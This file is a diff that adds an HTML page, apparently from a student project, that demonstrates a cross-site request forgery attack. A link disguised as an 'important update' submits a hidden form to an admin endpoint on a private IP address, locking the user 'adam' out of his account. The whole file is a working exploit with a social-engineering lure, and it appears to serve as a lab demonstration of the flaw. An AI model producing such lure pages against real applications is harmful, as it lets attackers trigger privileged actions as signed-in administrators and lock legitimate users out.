@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+   <head>
+       <title>CSRF Attack Form</title>
+   </head>
+   <body>
+       <h1>Perhaps the admin receives a seemingly inconspicuous email with a link attached.</h1>
+       <p>Click the link below to view an important update (WRONG! ADAM"S ACCOUNT WILL BE LOCKED INSTEAD!!):</p>
+       <!-- The hidden form will execute the CSRF attack -->
+       <form id="csrfForm" action="http://172.20.128.20:8080/FinalProj_Accounts/Admin" method="GET">
+           <input type="hidden" name="locked" value="adam">
+       </form>
+       <a href="#" onclick="document.getElementById('csrfForm').submit(); return false;">View Update</a>
+   </body>
+</html>
